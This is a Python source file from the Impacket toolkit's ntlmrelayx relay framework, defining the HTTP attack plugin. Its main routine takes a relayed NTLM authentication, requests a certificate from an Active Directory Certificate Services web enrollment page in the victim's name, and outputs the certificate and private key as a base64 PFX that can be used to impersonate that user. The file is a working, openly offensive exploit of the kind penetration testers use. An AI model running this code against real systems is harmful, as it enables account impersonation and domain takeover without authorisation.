# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   HTTP Attack Class
#   HTTP protocol relay attack
#
# Authors:
#   Alberto Solino (@agsolino)
#   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#   Ex Android Dev (@ExAndroidDev)
#
import re
import base64
from OpenSSL import crypto
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack

PROTOCOL_ATTACK_CLASS = "HTTPAttack"
# cache already attacked clients
ELEVATED = []


class HTTPAttack(ProtocolAttack):
    """
    This is the default HTTP attack. This attack only dumps the root page, though
    you can add any complex attack below. self.client is an instance of urrlib.session
    For easy advanced attacks, use the SOCKS option and use curl or a browser to simply
    proxy through ntlmrelayx
    """
    PLUGIN_NAMES = ["HTTP", "HTTPS"]
    def run(self):
        #Default action: Dump requested page to file, named username-targetname.html

        if self.config.isADCSAttack:
            self.adcs_relay_attack()
            return

        #You can also request any page on the server via self.client.session,
        #for example with:
        self.client.request("GET", "/")
        r1 = self.client.getresponse()
        print(r1.status, r1.reason)
        data1 = r1.read()
        print(data1)

        #Remove protocol from target name
        #safeTargetName = self.client.target.replace('http://','').replace('https://','')

        #Replace any special chars in the target name
        #safeTargetName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', safeTargetName)

        #Combine username with filename
        #fileName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username.decode('utf-16-le')) + '-' + safeTargetName + '.html'

        #Write it to the file
        #with open(os.path.join(self.config.lootdir,fileName),'w') as of:
        #    of.write(self.client.lastresult)

    def adcs_relay_attack(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)

        if self.username in ELEVATED:
            print('[*] Skipping user %s since attack was already performed' % self.username)
            return
        csr = self.generate_csr(key, self.username)
        csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
        print("[*] CSR generated!")

        data = "Mode=newreq&CertRequest=%s&CertAttrib=CertificateTemplate:%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, self.config.template)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data)
        }

        print("[*] Getting certificate...")

        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        ELEVATED.append(self.username)
        response = self.client.getresponse()

        if response.status != 200:
            print("[*] Error getting certificate! Make sure you have entered valid certiface template.")
            return

        content = response.read()
        found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', content.decode())
        if len(found) == 0:
            print("[*] Error obtaining certificate!")
            return

        certificate_id = found[0]

        self.client.request("GET", "/certsrv/certnew.cer?ReqID=" + certificate_id)
        response = self.client.getresponse()

        print("[*] GOT CERTIFICATE!")
        certificate = response.read().decode()

        certificate_store = self.generate_pfx(key, certificate)
        print("[*] Base64 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store).decode()))

    def generate_csr(self, key, CN):
        print("[*] Generating CSR...")
        req = crypto.X509Req()
        req.get_subject().CN = CN
        req.set_pubkey(key)
        req.sign(key, "sha256")

        return crypto.dump_certificate_request(crypto.FILETYPE_PEM, req)

    def generate_pfx(self, key, certificate):
        certificate = crypto.load_certificate(crypto.FILETYPE_PEM, certificate)
        p12 = crypto.PKCS12()
        p12.set_certificate(certificate)
        p12.set_privatekey(key)
        return p12.export()
